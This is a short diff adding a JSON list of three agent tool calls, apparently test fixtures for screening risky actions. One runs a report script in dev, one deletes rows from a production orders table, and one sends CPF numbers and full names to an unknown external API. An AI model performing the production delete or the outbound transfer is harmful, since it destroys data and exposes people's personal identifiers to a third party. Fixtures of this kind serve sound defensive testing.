@@ -1,0 +1,5 @@
+[
+  {"tool": "bash", "command": "python gerar_relatorio.py", "target_env": "dev"},
+  {"tool": "bash", "command": "DELETE FROM pedidos WHERE status='teste'", "target_env": "producao"},
+  {"tool": "http", "url": "https://api-desconhecida.com/enviar", "payload_fields": ["cpf", "nome_completo"]}
+]
